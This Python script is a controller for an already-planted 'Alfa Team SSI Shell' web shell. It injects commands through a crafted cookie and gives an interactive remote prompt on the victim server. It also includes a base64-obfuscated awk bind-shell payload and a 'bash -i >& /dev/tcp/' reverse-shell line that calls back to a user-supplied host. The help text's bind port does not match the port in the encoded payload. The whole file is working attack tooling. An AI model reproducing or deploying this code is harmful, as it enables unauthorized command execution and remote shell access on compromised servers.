#!/usr/bin/env python
#-*- coding: utf-8 -*-

import requests, time, os, base64
from bs4 import BeautifulSoup

# Alfa SSI SHELL

def alfa_shell(command, num):

	RQ = requests.get(url=ALFA_URL, headers={'User-agent': 'Mozilla/5.0'}, cookies={'x=$\'%s\'&&$x;' % (command).replace(' ', '\\x20'): ''}, verify=False)
	Soup = BeautifulSoup(RQ.content, 'html.parser')
	if(num == 1):
		return Soup.title.string
	elif(num == 0):
		return Soup.findAll('textarea')[0].text

ALFA_URL = raw_input('Please enter the web adress -> ')

title = alfa_shell('echo 1', 1)
server = alfa_shell('uname -a', 0).replace('\n', '')
whoami = alfa_shell('id', 0)

if(title == 'Alfa Team SSI Shell'):

	print "\n[i] Connecting... Wait a min!"
	time.sleep(2)
	os.system('cls' if os.name == 'nt' else 'clear')

	print "\n[+] Target : ", ALFA_URL
	print "[+] Unix : ", server
	print "[+] Whoami : ", whoami

	try:
		while True:
			shell = raw_input('@> ')
			if(shell == 'clear'):
				os.system('cls' if os.name == 'nt' else 'clear')
			elif(shell == 'help'):
				print "\n[+] Linux Command Shell, Bind TCP Stager (Port: 13337) : bind_tcp"
				print "[+] Linux Command Shell, Reverse TCP Stager (13337) : reverse_tcp ip\n"
			elif(shell.split()[0] == 'bind_tcp' and os.name != 'nt'):
				alfa_shell(command=(base64.b64decode('YXdrICdCRUdJTntzPSIvaW5ldC90Y3AvNDQ0NC8wLzAiO3doaWxlKDEpe2Rve3N8JmdldGxpbmUgYztpZihjKXt3aGlsZSgoY3wmZ2V0bGluZSk+MClwcmludCAkMHwmcztjbG9zZShjKX19d2hpbGUoYyE9ImV4aXQiKTtjbG9zZShzKX19Jw==')), num=0)
				print "\nPlease try to connect to TCP listener :)\n"
			elif(shell.split()[0] == 'reverse_tcp' and os.name != 'nt'):
				print "\nPlease create a TCP listener in 30s..\n"
				time.sleep(20)
				alfa_shell(command='bash -i >& /dev/tcp/' + shell.split()[1] + '/13337 0>&1', num=0)
			else:
				print "\n" + alfa_shell(command=shell, num=0)
	except KeyboardInterrupt as err:
		exit(1)




	
